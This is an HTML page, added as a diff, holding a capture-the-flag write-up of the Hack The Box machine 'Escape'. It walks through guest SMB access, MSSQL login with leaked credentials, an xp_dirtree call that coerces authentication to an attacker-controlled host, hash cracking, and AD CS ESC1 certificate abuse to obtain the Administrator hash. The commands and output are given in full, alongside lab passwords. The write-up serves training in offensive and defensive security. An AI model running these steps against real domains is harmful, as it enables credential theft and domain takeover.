@@ -1,0 +1,179 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Escape | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Active Directory</p>
+      <h1>HTB Escape</h1>
+      <p class="headline">MSSQL credential exposure, NetNTLMv2 coercion and AD CS ESC1</p>
+      <p class="meta">Medium - Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Escape is an Active Directory machine where the initial path starts with guest-accessible SMB shares. A public document exposes MSSQL credentials, which allow access to the SQL Server service. From there, <code>xp_dirtree</code> is used to coerce outbound SMB authentication and capture a NetNTLMv2 hash for the <code>sql_svc</code> account.</p>
+<p>After cracking the hash, WinRM access as <code>sql_svc</code> reveals SQL Server logs containing credentials for <code>Ryan.Cooper</code>. That user can request a certificate through a vulnerable AD CS template where the enrollee can supply the subject. By requesting a certificate for <code>administrator@sequel.htb</code>, it is possible to authenticate as Administrator and retrieve the NT hash.</p>
+<h2>Port Enumeration</h2>
+<p>The initial scan showed a Windows domain controller with Kerberos, LDAP, SMB, MSSQL, WinRM, AD Web Services and Global Catalog ports exposed.</p>
+<pre><code class="language-bash">Nmap scan report for 10.129.228.253
+Host is up, received user-set (0.14s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1433/tcp  open  ms-sql-s
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49667/tcp open  unknown
+49685/tcp open  unknown
+49686/tcp open  unknown
+49709/tcp open  unknown
+64517/tcp open  unknown
+64538/tcp open  unknown</code></pre>
+<p>Service enumeration was then focused on the discovered ports.</p>
+<pre><code class="language-bash">sudo nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49685,49686,49709,64517,64538 -sCV -vvv -oN Targeted 10.129.228.253</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260514192943.png" alt="Targeted service enumeration" /></figure>
+<h2>SMB Enumeration as Guest</h2>
+<p>Guest authentication was accepted over SMB. The <code>Public</code> share allowed read access, which became the initial foothold for credential discovery.</p>
+<pre><code class="language-bash">nxc smb 10.129.69.23 -u &#39;guest&#39; -p &#39;&#39; --shares</code></pre>
+<pre><code class="language-text">SMB  10.129.69.23  445  DC  [+] sequel.htb\guest:
+SMB  10.129.69.23  445  DC  [*] Enumerated shares
+
+Share     Permissions  Remark
+-----     -----------  ------
+ADMIN$                 Remote Admin
+C$                     Default share
+IPC$      READ         Remote IPC
+NETLOGON               Logon server share
+Public    READ
+SYSVOL                 Logon server share</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519180333.png" alt="SMB share enumeration as guest" /></figure>
+<p>The <code>Public</code> share contained a document named <code>SQL Server Procedures.pdf</code>.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519180819.png" alt="Public share with readable content" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519181037.png" alt="SQL Server Procedures document" /></figure>
+<p>Reviewing the document revealed a low-privileged MSSQL account.</p>
+<pre><code class="language-text">user: PublicUser
+password: GuestUserCantWrite1</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519181323.png" alt="Credentials exposed in the SQL Server document" /></figure>
+<h2>MSSQL Access and NetNTLMv2 Capture</h2>
+<p>The exposed credentials allowed authentication to MSSQL through Impacket.</p>
+<pre><code class="language-bash">mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb</code></pre>
+<pre><code class="language-text">[*] Encryption required, switching to TLS
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to &#39;master&#39;.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+SQL (PublicUser guest@master)&gt;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519181809.png" alt="MSSQL login as PublicUser" /></figure>
+<p>The next step was to abuse <code>xp_dirtree</code> to force SQL Server to connect to the attacker-controlled host over SMB. This caused the service account to leak a NetNTLMv2 challenge-response to Responder.</p>
+<pre><code class="language-sql">xp_dirtree &#39;\\10.10.17.23\test&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519183759.png" alt="xp_dirtree available from MSSQL" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519184013.png" alt="Responder captures sql_svc NetNTLMv2" /></figure>
+<p>The captured hash was cracked with John the Ripper.</p>
+<pre><code class="language-bash">john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt SMB-NTLMv2-SSP-10.129.69.23.txt</code></pre>
+<pre><code class="language-text">REGGIE1234ronnie (sql_svc)</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519184549.png" alt="Cracked sql_svc password" /></figure>
+<h2>Initial Access as sql_svc</h2>
+<p>The recovered password was valid for WinRM, providing an interactive shell as <code>sql_svc</code>.</p>
+<pre><code class="language-bash">evil-winrm -i 10.129.69.23 -u &#39;sql_svc&#39; -p &#39;REGGIE1234ronnie&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519185002.png" alt="WinRM access as sql_svc" /></figure>
+<p>After enumerating local users and directories, a <code>C:\SQLServer\logs</code> directory was discovered. The file <code>ERRORLOG.BAK</code> contained a useful authentication failure entry.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519185624.png" alt="Local user enumeration" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519185804.png" alt="SQLServer logs directory" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519190132.png" alt="Downloaded ERRORLOG" /></figure>
+<p>The log showed a failed login attempt for <code>Ryan.Cooper</code> where the password had been entered into the username field or exposed in the log context.</p>
+<pre><code class="language-text">Ryan.Cooper / NuclearMosquito3</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519190731.png" alt="Ryan Cooper credential disclosure in SQL Server log" /></figure>
+<p>The credentials were valid for SMB and WinRM.</p>
+<pre><code class="language-bash">nxc smb 10.129.69.23 -u &#39;Ryan.Cooper&#39; -p &#39;NuclearMosquito3&#39;
+nxc winrm 10.129.69.23 -u &#39;Ryan.Cooper&#39; -p &#39;NuclearMosquito3&#39;
+
+evil-winrm -i 10.129.69.23 -u &#39;Ryan.Cooper&#39; -p &#39;NuclearMosquito3&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519190703.png" alt="Ryan Cooper WinRM validation" /></figure>
+<p>At this stage, the user flag was accessible.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519191037.png" alt="User flag" /></figure>
+<h2>Privilege Escalation through AD CS</h2>
+<p>With valid domain credentials for <code>Ryan.Cooper</code>, AD CS was enumerated through LDAP. The domain exposed a PKI enrollment server and certificate authority.</p>
+<pre><code class="language-bash">nxc ldap 10.129.69.23 -u &#39;Ryan.Cooper&#39; -p &#39;NuclearMosquito3&#39; -M adcs</code></pre>
+<pre><code class="language-text">Found PKI Enrollment Server: dc.sequel.htb
+Found CN: sequel-DC-CA</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519192221.png" alt="AD CS discovery through LDAP" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519192823.png" alt="Certificate authority details" /></figure>
+<p><code>Certify.exe</code> was uploaded through Evil-WinRM to identify vulnerable certificate templates from the current user&#39;s context.</p>
+<pre><code class="language-powershell">upload Certify.exe
+.\Certify.exe find /vulnerable /currentuser</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519193637.png" alt="Certify upload through Evil-WinRM" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519194023.png" alt="Certify vulnerable template discovery" /></figure>
+<p>The vulnerable template allowed <code>ENROLLEE_SUPPLIES_SUBJECT</code>, meaning the requester could supply an arbitrary subject alternative name. Because low-privileged domain users could enroll, this matched an AD CS ESC1-style abuse path.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519194208.png" alt="ENROLLEE_SUPPLIES_SUBJECT on vulnerable template" /></figure>
+<p>A certificate was requested for <code>administrator@sequel.htb</code> using the vulnerable template.</p>
+<pre><code class="language-bash">certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 \
+  -upn administrator@sequel.htb \
+  -target sequel.htb \
+  -ca sequel-dc-ca \
+  -template UserAuthentication</code></pre>
+<pre><code class="language-text">[*] Request ID is 13
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;administrator@sequel.htb&#39;
+[*] Saving certificate and private key to &#39;administrator.pfx&#39;</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260519200842.png" alt="Certificate request for Administrator UPN" /></figure>
+<p>The issued certificate was then used to authenticate and retrieve the Administrator NT hash.</p>
+<pre><code class="language-bash">certipy auth -pfx administrator.pfx -dc-ip 10.129.69.23</code></pre>
+<pre><code class="language-text">[*] Got TGT
+[*] Saving credential cache to &#39;administrator.ccache&#39;
+[*] Got hash for &#39;administrator@sequel.htb&#39;: aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</code></pre>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260520091404.png" alt="Administrator authentication with certificate" /></figure>
+<p>The Administrator hash provided privileged access and the root flag was recovered.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260520091634.png" alt="Administrator shell" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/escape/Pasted%20image%2020260520091714.png" alt="Root flag" /></figure>
+<h2>Key Takeaways</h2>
+<ul>
+<li>Guest-readable SMB shares can expose operational documents with reusable credentials.</li>
+<li>MSSQL features such as <code>xp_dirtree</code> can be abused to coerce outbound SMB authentication and capture NetNTLMv2 material.</li>
+<li>SQL Server logs may disclose credentials when authentication failures are mishandled or passwords are entered in the wrong field.</li>
+<li>AD CS templates with enrollee-supplied subject names and broad enrollment rights can enable full domain compromise through ESC1-style abuse.</li>
+</ul>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
